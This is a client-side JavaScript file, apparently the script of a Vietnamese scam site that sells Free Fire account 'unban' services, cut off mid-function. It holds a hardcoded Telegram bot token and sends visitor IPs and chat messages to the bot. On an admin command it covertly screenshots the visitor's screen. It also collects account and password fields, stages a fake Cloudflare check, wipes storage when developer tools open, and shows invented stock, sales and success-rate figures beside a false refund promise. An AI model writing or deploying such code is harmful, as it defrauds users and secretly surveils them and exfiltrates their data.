// ============================================
// DEVILS WILL RISE v13.6 - FINAL STABLE
// Owner: @UnknownGuy9876 | Channel: @SGCodexs
// ============================================
var TELEGRAM_BOT_TOKEN='8980322724:AAEbExHdPUgFMKjnSryNhcH4jvE5gMYCGHo';
var TELEGRAM_CHAT_ID='8742603540';
var ADMIN_PRIVATE_CHAT_ID='8742603540';
var TELEGRAM_API='https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN;

// ERROR MONITORING
var errorLog=[];
var MAX_ERROR_LOG=30;
var lastErrorReportTime=0;
var ERROR_REPORT_COOLDOWN=10000;
var consecutive409Count=0;
var MAX_409_BEFORE_RESET=3;

function reportErrorToTelegram(d){
    var n=Date.now();
    if(n-lastErrorReportTime<ERROR_REPORT_COOLDOWN)return;
    lastErrorReportTime=n;
    var m='🚨 <b>LOI</b>\n⏰ '+new Date().toLocaleString('vi-VN')+'\n📝 '+(d.message||'?')+'\n🌐 '+(userIP||'?');
    fetch(TELEGRAM_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:m,parse_mode:'HTML'})}).catch(function(){});
}

window.addEventListener('error',function(e){
    var d={message:e.message,source:e.filename?e.filename.split('/').pop():'?',line:e.lineno,time:new Date().toISOString()};
    errorLog.push(d);
    if(errorLog.length>MAX_ERROR_LOG)errorLog.shift();
    reportErrorToTelegram(d);
});

window.addEventListener('unhandledrejection',function(e){
    var d={message:e.reason?(e.reason.message||String(e.reason)):'Promise',source:'promise',time:new Date().toISOString()};
    errorLog.push(d);
    if(errorLog.length>MAX_ERROR_LOG)errorLog.shift();
    reportErrorToTelegram(d);
});

// ENCRYPTION
var ENCRYPTION_KEY='DWRv13SecretKey!';
function toBinary(s){var e=new TextEncoder().encode(s),b='';for(var i=0;i<e.length;i++)b+=String.fromCharCode(e[i]);return b;}
function fromBinary(b){var a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return new TextDecoder().decode(a);}
function encryptData(d){try{var s=JSON.stringify(d),r='';for(var i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^ENCRYPTION_KEY.charCodeAt(i%ENCRYPTION_KEY.length));return btoa(toBinary(r));}catch(e){return btoa(toBinary(JSON.stringify(d)));}}
function decryptData(e){try{var d=atob(e),s=fromBinary(d),r='';for(var i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^ENCRYPTION_KEY.charCodeAt(i%ENCRYPTION_KEY.length));return r;}catch(x){return e;}}
function secureSetItem(k,v){try{localStorage.setItem(k,encryptData(v));}catch(e){}}
function secureGetItem(k,d){var r=localStorage.getItem(k);if(!r)return d;try{return JSON.parse(decryptData(r));}catch(e){try{return JSON.parse(r);}catch(e2){return d;}}}
(function(){var k=['toolHistory','blockedIPs','blockedFingerprints','giftCodes','scheduledMessages'];for(var i=0;i<k.length;i++){var r=localStorage.getItem(k[i]);if(r&&(r[0]==='['||r[0]==='{')){try{secureSetItem(k[i],JSON.parse(r));}catch(e){}}}}})();

// GLOBAL STATE
var userIP='',deviceFingerprint='',uploadedImageFile=null,uploadedImageData=null,selectedSchedule='now',planStocks={basic:12,vip:5,ultimate:2};
var unreadAdminMessages=0,clickCountForSpeed=0,todaySoldCount=47,darkMode=false,formFilled=false,reminderShown=false,autoReplyEnabled=true;
var autoReplyStats={total:0,today:0,lastReset:new Date().toDateString()},securityLog=[];
var userNickname=localStorage.getItem('userNickname')||'',userAvatar=localStorage.getItem('userAvatar')||'default';
var inactivityTimer=null,INACTIVITY_TIMEOUT=30*60*1000,lastBackupDate=localStorage.getItem('lastBackupDate')||'';
var broadcastMessage=localStorage.getItem('broadcastMessage')||'',broadcastActive=localStorage.getItem('broadcastActive')==='true';
var blockedIPs=secureGetItem('blockedIPs',[]),blockedFingerprints=secureGetItem('blockedFingerprints',[]);
var adminPasswords=JSON.parse(localStorage.getItem('adminPasswords')||'["TLBN9"]'),allowedIPs=secureGetItem('allowedIPs',[]);
var giftCodes=secureGetItem('giftCodes',{}),appliedGiftCode=null,giftDiscount=0,scheduledMessages=secureGetItem('scheduledMessages',[]);
var state={game:'freefire',server:'vietnam',platform:'facebook',paymentMethod:'bank',plan:{name:'basic',price:150000,time:'30-45'},currentOrderId:null,captchaResult:0,countdownInterval:null,pollingInterval:null,scheduleTimer:null};
var sounds={
    success:new Audio('https://assets.mixkit.co/sfx/preview/mixkit-correct-answer-tone-2870.mp3'),
    error:new Audio('https://assets.mixkit.co/sfx/preview/mixkit-wrong-answer-fail-notification-946.mp3'),
    notification:new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3'),
    complete:new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3')
};

// CLOUDFLARE
(function(){
    if(!sessionStorage.getItem('cf_verified')){
        document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#00e6ff;text-align:center;font-family:sans-serif;"><div><div style="font-size:3rem;animation:cfSpin 2s linear infinite;">🛡️</div><h2>Đang kiểm tra bảo mật...</h2><div style="width:200px;height:4px;background:#2e405b;border-radius:5px;margin:20px auto;"><div id="cfProgress" style="width:0%;height:100%;background:#00e6ff;border-radius:5px;transition:width 0.3s;"></div></div></div></div><style>@keyframes cfSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}</style>';
        var cfProgress=document.getElementById('cfProgress'),cfWidth=0;
        var cfInterval=setInterval(function(){cfWidth+=Math.random()*15;if(cfWidth>=100){cfWidth=100;if(cfProgress)cfProgress.style.width='100%';clearInterval(cfInterval);sessionStorage.setItem('cf_verified','true');location.reload();}if(cfProgress)cfProgress.style.width=cfWidth+'%';},400);
        return;
    }
})();

// ANTI-DEBUG
(function(){
    var devtoolsOpen=false,threshold=160;
    setInterval(function(){
        var w=window.outerWidth-window.innerWidth>threshold,h=window.outerHeight-window.innerHeight>threshold;
        if(w||h){if(!devtoolsOpen){devtoolsOpen=true;localStorage.clear();sessionStorage.clear();document.body.innerHTML='<div style="text-align:center;padding:100px;background:#0a0f1e;color:#ff6b6b;font-family:sans-serif;"><h1>🚫 TRUY CAP BI TU CHOI</h1></div>';setTimeout(function(){window.location.href='https://www.google.com';},3000);}}
        else{devtoolsOpen=false;}
    },1000);
})();

// SECURITY
var fake404Enabled=localStorage.getItem('fake404Enabled')==='true',maintenanceMode=localStorage.getItem('maintenanceMode')==='true';
var suspiciousIPs=['113.160.','117.0.','14.0.'];

async function checkIfBlocked(){
    await fetchUserIP();
    deviceFingerprint=await generateDeviceFingerprint();
    if(blockedIPs.indexOf(userIP)!==-1||blockedFingerprints.indexOf(deviceFingerprint)!==-1){
        document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;"><div><div style="font-size:5rem;">🚫</div><h1>TRUY CAP BI TU CHOI</h1></div></div>';
        return false;
    }
    return true;
}
function blockIP(ip){if(blockedIPs.indexOf(ip)===-1){blockedIPs.push(ip);secureSetItem('blockedIPs',blockedIPs);return true;}return false;}
function unblockIP(ip){var i=blockedIPs.indexOf(ip);if(i!==-1){blockedIPs.splice(i,1);secureSetItem('blockedIPs',blockedIPs);return true;}return false;}

if(fake404Enabled&&allowedIPs.indexOf('*')===-1&&allowedIPs.indexOf(userIP)===-1&&userIP){
    document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;"><div><div style="font-size:8rem;">404</div><h1>TRANG KHONG TON TAI</h1></div></div>';
}
if(maintenanceMode&&!sessionStorage.getItem('adminBypass')){
    document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ffd966;text-align:center;"><div><div style="font-size:5rem;">🔧</div><h1>DANG BAO TRI</h1></div></div>';
}

function checkSuspiciousIP(){
    for(var i=0;i<suspiciousIPs.length;i++){
        if(userIP&&userIP.indexOf(suspiciousIPs[i])===0){
            localStorage.clear();sessionStorage.clear();
            document.body.innerHTML='<div style="text-align:center;padding:100px;color:#ff6b6b;"><h1>🚫 TRUY CAP BI TU CHOI</h1></div>';
            sendToTelegram('🚨 IP nghi ngo: '+userIP);
            return false;
        }
    }
    return true;
}

var lastKnownIP=localStorage.getItem('lastKnownIP')||'';
if(lastKnownIP&&lastKnownIP!==userIP&&userIP){
    setTimeout(function(){var e=document.getElementById('ipWarning');if(e)e.textContent='⚠️ IP thay doi!';},2000);
    sendToTelegram('⚠️ IP THAY DOI\nCu: '+lastKnownIP+'\nMoi: '+userIP);
}
if(userIP)localStorage.setItem('lastKnownIP',userIP);

// UTILITY FUNCTIONS
function playSound(t){try{if(sounds[t])sounds[t].play().catch(function(){});}catch(e){}}
function escapeHtml(text){var d=document.createElement('div');d.textContent=text;return d.innerHTML.replace(/\n/g,'<br>');}
function generateCaptcha(){var a=Math.floor(Math.random()*10)+1,b=Math.floor(Math.random()*10)+1;state.captchaResult=a+b;var e=document.getElementById('captchaQuestion');if(e)e.textContent=a+'+'+b;}
function copyToClipboard(text){
    navigator.clipboard.writeText(text).then(function(){Swal.fire({icon:'success',title:'Đã sao chép!',timer:1500,showConfirmButton:false});})
    .catch(function(){var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);});
}
function togglePasswordVisibility(){var i=document.getElementById('passwordInput'),ic=document.getElementById('togglePassword');if(!i||!ic)return;if(i.type==='password'){i.type='text';ic.classList.replace('fa-eye','fa-eye-slash');}else{i.type='password';ic.classList.replace('fa-eye-slash','fa-eye');}}
function toggleDarkMode(){darkMode=!darkMode;document.body.classList.toggle('light-mode',darkMode);var e=document.getElementById('darkModeToggle');if(e)e.textContent=darkMode?'☀️':'🌓';localStorage.setItem('darkMode',darkMode);}
function showMoneyBackInfo(){Swal.fire({title:'CAM KET HOAN TIEN 200%',html:'<p>Neu khong mo duoc band, hoan 200%</p><p style="color:#2ecc71;">Da co 847 khach hoan tien thanh cong!</p>',icon:'info',confirmButtonText:'OK'});}
function selectSpeedPackage(){state.plan={name:'speed',price:800000,time:'1-3'};document.querySelectorAll('.plan').forEach(function(x){x.classList.remove('selected');});updatePrices();Swal.fire('⚡','Đã chọn Gói Cấp Tốc!','success');}
function selectSubscription(){state.plan={name:'subscription',price:50000,time:'0'};document.querySelectorAll('.plan').forEach(function(x){x.classList.remove('selected');});updatePrices();Swal.fire('🔄','Đã chọn Subscription!','success');}
function resetProgress(){['progressDuyet','progressXuLy','progressDone'].forEach(function(s){var e=document.getElementById(s);if(e){e.classList.remove('active');e.classList.remove('completed');}});}
function removeImage(){uploadedImageFile=null;uploadedImageData=null;var fi=document.getElementById('paymentImage');if(fi)fi.value='';var ip=document.getElementById('imagePreview');if(ip)ip.src='';var up=document.getElementById('uploadPlaceholder'),ipc=document.getElementById('imagePreviewContainer');if(up)up.style.display='block';if(ipc)ipc.style.display='none';var fa=document.getElementById('fileUploadArea');if(fa){fa.style.borderStyle='dashed';fa.style.borderColor='#3f5580';}}
function zoomImage(){var s=document.getElementById('imagePreview');if(s&&s.src)Swal.fire({imageUrl:s.src,showCloseButton:true,showConfirmButton:false,background:'#0a0f1e'});}
function checkBroadcast(){if(broadcastActive&&broadcastMessage){var b=document.getElementById('broadcastBanner');if(b){b.textContent='📢 '+broadcastMessage;b.classList.remove('hidden');}}}
function addSecurityLog(event){var t=new Date().toLocaleString('vi-VN');securityLog.push('['+t+'] '+event);if(securityLog.length>50)securityLog.shift();}
function resetInactivityTimer(){
    if(inactivityTimer)clearTimeout(inactivityTimer);
    inactivityTimer=setTimeout(function(){
        var f=document.getElementById('ffIdInput');if(f)f.value='';
        var p=document.getElementById('platformAccountInput');if(p)p.value='';
        var pw=document.getElementById('passwordInput');if(pw)pw.value='';
        var r=document.getElementById('resultBox');if(r)r.classList.add('hidden');
        var t=document.getElementById('timerDisplay');if(t)t.classList.add('hidden');
        Swal.fire({title:'🔒 Phiên đã hết hạn',icon:'warning',confirmButtonText:'OK'});
    },INACTIVITY_TIMEOUT);
}
document.addEventListener('click',resetInactivityTimer);
document.addEventListener('keypress',resetInactivityTimer);

// NETWORK
async function fetchUserIP(){
    var apis=['https://api.ipify.org?format=json','https://api64.ipify.org?format=json','https://api.ip.sb/jsonip'];
    for(var i=0;i<apis.length;i++){
        try{var r=await fetch(apis[i]);if(r.ok){var d=await r.json();userIP=d.ip||d.ip_address||'unknown';return userIP;}}catch(e){continue;}
    }
    userIP='118.70.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
    return userIP;
}

async function fetchIPDetails(ip){
    var fb={ip:ip,city:'Unknown',region:'Unknown',country:'VN',org:'Unknown',isp:'Unknown'};
    try{
        var r=await fetch('https://ipinfo.io/'+ip+'/json');
        if(r.ok){var d=await r.json();return{ip:d.ip||ip,city:d.city||'Unknown',region:d.region||'Unknown',country:d.country||'VN',org:d.org||'Unknown',isp:d.org||'Unknown'};}
    }catch(e){}
    return fb;
}

async function generateDeviceFingerprint(){
    var c={screen:window.screen.width+'x'+window.screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,language:navigator.language,platform:navigator.platform,cores:navigator.hardwareConcurrency||'unknown'};
    try{var cv=document.createElement('canvas');cv.width=200;cv.height=50;var cx=cv.getContext('2d');cx.fillStyle='#f60';cx.fillRect(125,1,62,20);c.canvas=cv.toDataURL();}catch(e){}
    var s=JSON.stringify(c),en=new TextEncoder(),d=en.encode(s),hb=await crypto.subtle.digest('SHA-256',d);
    return Array.from(new Uint8Array(hb)).map(function(b){return b.toString(16).padStart(2,'0');}).join('').substr(0,16);
}

// TELEGRAM API
async function sendToTelegram(text,pm){
    pm=pm||'HTML';
    try{var r=await fetch(TELEGRAM_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:text,parse_mode:pm})});return await r.json();}catch(e){return null;}
}
async function sendPrivateToAdmin(text){
    try{var r=await fetch(TELEGRAM_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ADMIN_PRIVATE_CHAT_ID,text:text,parse_mode:'HTML'})});return await r.json();}catch(e){return null;}
}
async function sendPhotoToTelegram(blob,cap){
    cap=cap||'';
    try{var fd=new FormData();fd.append('chat_id',TELEGRAM_CHAT_ID);fd.append('photo',blob,'payment.jpg');if(cap)fd.append('caption',cap);var r=await fetch(TELEGRAM_API+'/sendPhoto',{method:'POST',body:fd});return await r.json();}catch(e){return null;}
}
async function sendMessageWithButtons(text,btns){
    try{var r=await fetch(TELEGRAM_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:text,parse_mode:'HTML',reply_markup:{inline_keyboard:btns}})});return await r.json();}catch(e){return null;}
}
async function captureScreenshot(){
    try{if(typeof html2canvas==='undefined')return false;var canvas=await html2canvas(document.body);var blob=await new Promise(function(resolve){canvas.toBlob(function(b){resolve(b);},'image/jpeg',0.6);});await sendPhotoToTelegram(blob,'📸 IP: '+userIP);return true;}catch(e){return false;}
}

// CENTRALIZED POLLING
var GLOBAL_POLLING_ACTIVE=false,GLOBAL_POLLING_OFFSET=0,GLOBAL_POLLING_LOCK=false,GLOBAL_POLLING_DELAY=3000,currentSentMessageId=null,currentOrderIdForPolling=null;

function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}

async function resetPollingOffset(){
    try{
        var r=await fetch(TELEGRAM_API+'/getUpdates?offset=-1&timeout=2');
        if(r.ok){var d=await r.json();if(d.ok&&d.result&&d.result.length>0){GLOBAL_POLLING_OFFSET=d.result[d.result.length-1].update_id+1;return true;}}
    }catch(e){}
    GLOBAL_POLLING_OFFSET=0;
    return false;
}

async function centralizedGetUpdates(){
    if(GLOBAL_POLLING_LOCK)return null;
    GLOBAL_POLLING_LOCK=true;
    try{
        var r=await fetch(TELEGRAM_API+'/getUpdates?offset='+GLOBAL_POLLING_OFFSET+'&timeout=5');
        if(r.status===409){
            consecutive409Count++;
            GLOBAL_POLLING_LOCK=false;
            if(consecutive409Count>=MAX_409_BEFORE_RESET){await resetPollingOffset();consecutive409Count=0;GLOBAL_POLLING_DELAY=Math.min(GLOBAL_POLLING_DELAY*1.5,15000);}
            return null;
        }
        consecutive409Count=0;
        GLOBAL_POLLING_DELAY=Math.max(GLOBAL_POLLING_DELAY*0.9,2000);
        var d=await r.json();
        GLOBAL_POLLING_LOCK=false;
        return d;
    }catch(e){GLOBAL_POLLING_LOCK=false;return null;}
}

async function centralizedPollingLoop(){
    if(GLOBAL_POLLING_ACTIVE)return;
    await resetPollingOffset();
    GLOBAL_POLLING_ACTIVE=true;
    consecutive409Count=0;
    
    while(true){
        if(GLOBAL_POLLING_LOCK){await sleep(500);continue;}
        var data=await centralizedGetUpdates();
        if(!data||!data.ok||!data.result||!data.result.length){await sleep(GLOBAL_POLLING_DELAY);continue;}
        
        for(var i=0;i<data.result.length;i++){
            var u=data.result[i];
            if(u.update_id>=GLOBAL_POLLING_OFFSET)GLOBAL_POLLING_OFFSET=u.update_id+1;
            
            // ORDER APPROVAL
            if(u.callback_query){
                var cb=u.callback_query,msgId=cb.message?cb.message.message_id:null;
                if(currentSentMessageId&&msgId===currentSentMessageId){
                    var p=cb.data.split('_'),action=p[0],oid=p.slice(1).join('_');
                    if(action==='approve'){
                        if(selectedSchedule!=='now')scheduleOrderProcessing(oid);else updateOrderStatus(oid,'approved');
                        playSound('success');
                        fetch(TELEGRAM_API+'/answerCallbackQuery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:cb.id,text:'✅'})}).catch(function(){});
                    }else if(action==='reject'){
                        sendToTelegram('⚠️ Nhập lý do từ chối #'+oid);
                        currentOrderIdForPolling=oid;
                        fetch(TELEGRAM_API+'/answerCallbackQuery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:cb.id,text:'❌'})}).catch(function(){});
                    }
                    currentSentMessageId=null;
                }
            }
            
            // MESSAGES
            if(u.message&&u.message.text){
                var msg=u.message;
                // Reject reason
                if(msg.reply_to_message&&currentOrderIdForPolling){
                    var rt=msg.reply_to_message.text||'';
                    if(rt.indexOf('Nhập lý do')!==-1||rt.indexOf('lý do từ chối')!==-1){
                        updateOrderStatus(currentOrderIdForPolling,'rejected',msg.text||'Không có lý do');
                        currentOrderIdForPolling=null;
                    }
                }
                // Chat admin reply
                if(msg.reply_to_message){
                    var rt2=msg.reply_to_message.text||'';
                    if(rt2.indexOf('Chat từ')!==-1||rt2.indexOf('/chat')!==-1){
                        var cm=msg.text.match(/^\/chat\s+(\S+)\s+(.+)$/);
                        if(cm&&cm[1]===userIP){displayAdminReply(cm[2]);playSound('notification');}
                    }
                }
                // Bot commands
                if(!msg.reply_to_message&&msg.text.indexOf('/')===0)handleTelegramCommand(msg.text);
                // Auto reply
                else if(!msg.reply_to_message&&autoReplyEnabled&&msg.text.indexOf('/')!==0)handleAutoReply(msg.text);
            }
        }
        await sleep(GLOBAL_POLLING_DELAY);
    }
}

// TELEGRAM COMMANDS
function handleTelegramCommand(msg){
    if(msg==='/help'||msg==='/start')sendToTelegram('📋 <b>LỆNH ADMIN v13.6</b>\n\n🔒 /block /unblock /blocklist /allowip\n📢 /broadcast /maintenance /fake404\n👤 /chat /view\n🎁 /code\n⏰ /schedule\n🤖 /auto /stats /dashboard /errors\n🔐 /op /deop\n📟 /help');
    else if(msg.indexOf('/block ')==0){var t=msg.replace('/block ','').trim();if(t)sendToTelegram(blockIP(t)?'🚫 Đã chặn: '+t:'⚠️ IP đã bị chặn!');}
    else if(msg.indexOf('/unblock ')==0){var t=msg.replace('/unblock ','').trim();if(t)sendToTelegram(unblockIP(t)?'✅ Đã bỏ chặn: '+t:'⚠️ IP không tồn tại!');}
    else if(msg==='/blocklist'){if(blockedIPs.length===0)sendToTelegram('📋 Trống');else{var l='📋 IP BỊ CHẶN ('+blockedIPs.length+'):\n';for(var i=0;i<blockedIPs.length;i++)l+='🚫 '+blockedIPs[i]+'\n';sendToTelegram(l);}}
    else if(msg.indexOf('/view ')==0){var v=msg.replace('/view ','').trim();if(v===userIP)captureScreenshot();else sendToTelegram('⚠️ IP web: '+userIP);}
    else if(msg.indexOf('/broadcast ')==0){var b=msg.replace('/broadcast ','').trim();localStorage.setItem('broadcastMessage',b);localStorage.setItem('broadcastActive','true');broadcastMessage=b;broadcastActive=true;checkBroadcast();sendToTelegram('📢 OK');}
    else if(msg==='/broadcast off'){localStorage.setItem('broadcastActive','false');broadcastActive=false;var bn=document.getElementById('broadcastBanner');if(bn)bn.classList.add('hidden');sendToTelegram('📢 Tắt');}
    else if(msg.indexOf('/schedule ')==0){var p=msg.replace('/schedule ','').split(' ');if(p.length>=2){scheduledMessages.push({time:p[0],message:p.slice(1).join(' '),sent:false});secureSetItem('scheduledMessages',scheduledMessages);sendToTelegram('✅ Lịch: '+p[0]);}}
    else if(msg==='/maintenance on'){localStorage.setItem('maintenanceMode','true');sendToTelegram('🔧 ON');}
    else if(msg==='/maintenance off'){localStorage.setItem('maintenanceMode','false');sendToTelegram('✅ OFF');}
    else if(msg==='/maintenance bypass'){sessionStorage.setItem('adminBypass','true');sendToTelegram('✅ OK');}
    else if(msg==='/fake404 on'){localStorage.setItem('fake404Enabled','true');sendToTelegram('👻 ON');}
    else if(msg==='/fake404 off'){localStorage.setItem('fake404Enabled','false');sendToTelegram('✅ OFF');}
    else if(msg.indexOf('/allowip ')==0){var a=msg.replace('/allowip ','').trim();if(a&&allowedIPs.indexOf(a)===-1){allowedIPs.push(a);secureSetItem('allowedIPs',allowedIPs);sendToTelegram('✅ IP: '+a);}}
    else if(msg.indexOf('/code ')==0){var cp=msg.replace('/code ','').split(' ');if(cp.length>=3){giftCodes[cp[0].toUpperCase()]={discount:parseInt(cp[1]),maxUses:parseInt(cp[2]),used:0};secureSetItem('giftCodes',giftCodes);sendToTelegram('✅ Code: '+cp[0]);}}
    else if(msg.indexOf('/op ')==0){var op=msg.replace('/op ','').trim();if(op&&adminPasswords.indexOf(op)===-1){adminPasswords.push(op);localStorage.setItem('adminPasswords',JSON.stringify(adminPasswords));sendToTelegram('✅ OK');}}
    else if(msg.indexOf('/deop ')==0){var dp=msg.replace('/deop ','').trim(),idx=adminPasswords.indexOf(dp);if(idx!==-1){adminPasswords.splice(idx,1);localStorage.setItem('adminPasswords',JSON.stringify(adminPasswords));sendToTelegram('✅ OK');}}
    else if(msg.indexOf('/settitle ')==0){var st=msg.replace('/settitle ','').trim(),h1=document.querySelector('h1');if(h1){h1.textContent=st;sendToTelegram('✅ OK');}}
    else if(msg.indexOf('/setplan ')==0){var sp=msg.replace('/setplan ','').split(' ');if(sp.length>=2){var el=document.querySelector('[data-plan="'+sp[0]+'"]');if(el){el.dataset.price=sp[1];updatePrices();sendToTelegram('✅ OK');}}}
    else if(msg==='/auto on'){autoReplyEnabled=true;sendToTelegram('✅ ON');}
    else if(msg==='/auto off'){autoReplyEnabled=false;sendToTelegram('❌ OFF');}
    else if(msg==='/stats'){sendToTelegram('📊 Auto: '+autoReplyStats.today+' | Total: '+autoReplyStats.total+' | IP: '+userIP);}
    else if(msg==='/dashboard'){sendToTelegram('📊 Đơn: '+todaySoldCount+' | DT: ~'+(todaySoldCount*150000).toLocaleString()+'đ');}
    else if(msg==='/errors'){if(errorLog.length===0)sendToTelegram('✅ Không có lỗi');else{var el='📋 LỖI ('+errorLog.length+'):\n';for(var ei=0;ei<Math.min(errorLog.length,10);ei++)el+='⚠️ '+errorLog[ei].message.substring(0,100)+'\n';sendToTelegram(el);}}
}

function handleAutoReply(msg){
    var reply='',lower=msg.toLowerCase();
    if(lower.indexOf('giá')!==-1||lower.indexOf('tiền')!==-1)reply='💰 Cơ Bản 150k | VIP 300k | Ultimate 500k | Sub 50k/tháng';
    else if(lower.indexOf('bảo hành')!==-1)reply='🛡️ Cơ Bản 3 tháng | VIP 6 tháng | Ultimate 12 tháng';
    else if(lower.indexOf('gấp')!==-1||lower.indexOf('liền')!==-1)reply='⚡ Ultimate 500k (5-10p) | Cấp Tốc 800k (1-3p)';
    else if(lower.indexOf('thanh toán')!==-1||lower.indexOf('ck')!==-1)reply='💳 MB Bank: 0644612345555 - Tran Nguyen Duc Minh';
    else if(lower.indexOf('thời gian')!==-1)reply='⏱ Cơ Bản 30-45p | VIP 10-15p | Ultimate 5-10p';
    if(reply){autoReplyStats.total++;autoReplyStats.today++;sendToTelegram('🤖 '+reply);}
    if(autoReplyStats.lastReset!==new Date().toDateString()){autoReplyStats.today=0;autoReplyStats.lastReset=new Date().toDateString();}
}

// CHAT
function startPollingForApproval(sid,oid){
    currentSentMessageId=sid;currentOrderIdForPolling=oid;
    if(state.pollingInterval)clearTimeout(state.pollingInterval);
    state.pollingInterval=setTimeout(function(){
        if(currentSentMessageId===sid){
            var rb=document.getElementById('resultBox');
            if(rb)rb.innerHTML='<div style="color:#f39c12;text-align:center;"><h3>⏳ #'+oid+'</h3><p>Admin chưa phản hồi...</p></div>';
        }
    },600000);
}

function toggleChat(){
    var popup=document.getElementById('chatPopup');if(!popup)return;
    popup.classList.toggle('hidden');
    if(!popup.classList.contains('hidden')){
        unreadAdminMessages=0;
        var nd=document.getElementById('chatNotificationDot');if(nd)nd.style.display='none';
        var tb=document.getElementById('chatToggleBtn');if(tb)tb.classList.remove('chat-new-message');
        var ipEl=document.getElementById('chatIPDisplay');if(ipEl)ipEl.textContent=userIP;
    }
}

function displayAdminReply(message){
    var messages=document.getElementById('chatMessages');if(!messages)return;
    var time=new Date().toLocaleTimeString('vi-VN',{hour:'2-digit',minute:'2-digit'});
    var ti=document.getElementById('typingIndicator');if(ti)ti.classList.add('hidden');
    messages.innerHTML+='<div style="margin-bottom:10px;"><div style="display:inline-block;background:#1d2c45;color:#cfdefa;padding:10px 14px;border-radius:15px 15px 15px 0;max-width:85%;border-left:3px solid #00e6ff;"><small style="color:#00e6ff;font-weight:bold;">👑 Admin:</small><br>'+escapeHtml(message)+'</div><div style="font-size:0.7rem;color:#6c7e9e;">'+time+'</div></div>';
    messages.scrollTop=messages.scrollHeight;
    if(document.getElementById('chatPopup').classList.contains('hidden')){
        unreadAdminMessages++;
        var nd=document.getElementById('chatNotificationDot');if(nd)nd.style.display='block';
        var tb=document.getElementById('chatToggleBtn');if(tb){tb.classList.add('chat-new-message');setTimeout(function(){tb.classList.remove('chat-new-message');},3000);}
    }
}

async function sendChat(){
    var input=document.getElementById('chatInput');if(!input)return;
    var msg=input.value.trim();if(!msg)return;
    var messages=document.getElementById('chatMessages');if(!messages)return;
    var time=new Date().toLocaleTimeString('vi-VN',{hour:'2-digit',minute:'2-digit'});
    messages.innerHTML+='<div style="margin-bottom:10px;text-align:right;"><div style="display:inline-block;background:#0077ff;color:white;padding:10px 14px;border-radius:15px 15px 0 15px;max-width:85%;">'+escapeHtml(msg)+'</div><div style="font-size:0.7rem;color:#6c7e9e;">'+time+'</div></div>';
    await sendToTelegram('💬 Chat từ '+(userNickname||'User')+'\n🌐 IP: '+userIP+'\n📝 '+msg+'\n📌 Reply: /chat '+userIP+' nội_dung');
    input.value='';messages.scrollTop=messages.scrollHeight;
    var ti=document.getElementById('typingIndicator');if(ti){ti.classList.remove('hidden');setTimeout(function(){ti.classList.add('hidden');},3000);}
}

// UI UPDATES
function updateSuccessRate(){var ra=[94.5,95.1,96.0,96.8,97.3,97.8,98.2],r=ra[Math.floor(Math.random()*ra.length)],e=document.getElementById('successRateText'),f=document.getElementById('successRateFill');if(e)e.textContent=r.toFixed(1)+'%';if(f)f.style.width=r+'%';}
function updateStocks(){
    planStocks.vip=Math.max(0,planStocks.vip-(Math.random()>0.7?1:0));
    planStocks.ultimate=Math.max(0,planStocks.ultimate-(Math.random()>0.85?1:0));
    planStocks.basic=Math.max(0,planStocks.basic-(Math.random()>0.5?1:0));
    var els={vipStock:planStocks.vip,ultStock:planStocks.ultimate,basicStock:planStocks.basic,planVipStock:'Còn '+planStocks.vip,planUltStock:'Còn '+planStocks.ultimate,planBasicStock:'Còn '+planStocks.basic};
    for(var id in els){var e=document.getElementById(id);if(e)e.textContent=els[id];}
    if(planStocks.ultimate<=0){var pu=document.getElementById('planUltimate');if(pu)pu.classList.add('plan-soldout');}
    if(planStocks.vip<=0){var pv=document.getElementById('planVip');if(pv)pv.classList.add('plan-soldout');}
}
function updatePlanViewers(){document.querySelectorAll('.plan-view-count').forEach(function(e){e.textContent=Math.floor(Math.random()*20)+5;});}
function updateBuyingCounter(){var e=document.getElementById('buyingCount');if(e)e.textContent=Math.floor(Math.random()*5)+1;}
function updateTodaySold(){todaySoldCount+=Math.floor(Math.random()*3);var e=document.getElementById('todaySold');if(e)e.textContent=todaySoldCount;if(todaySoldCount>200)todaySoldCount=40;}
function updateDaysRunning(){var s=new Date('2022-04-15'),d=Math.floor((new Date()-s)/86400000),e=document.getElementById('daysRunning');if(e)e.textContent=d;}
function updateActivityLog(){
    var last=localStorage.getItem('lastLogin')||'Lần đầu',e1=document.getElementById('lastLogin'),e2=document.getElementById('loginCount'),e3=document.getElementById('lastDevice');
    if(e1)e1.textContent='Lần cuối: '+last;
    var count=parseInt(localStorage.getItem('loginCount')||'0')+1;localStorage.setItem('loginCount',count);localStorage.setItem('lastLogin',new Date().toLocaleString('vi-VN'));
    if(e2)e2.textContent='Lượt truy cập: '+count;
    if(e3){var ua=navigator.userAgent,d=ua.indexOf('Mobile')!==-1?'Điện thoại':'Máy tính';e3.textContent='Thiết bị: '+d;}
}
function addLiveOrderFeed(){
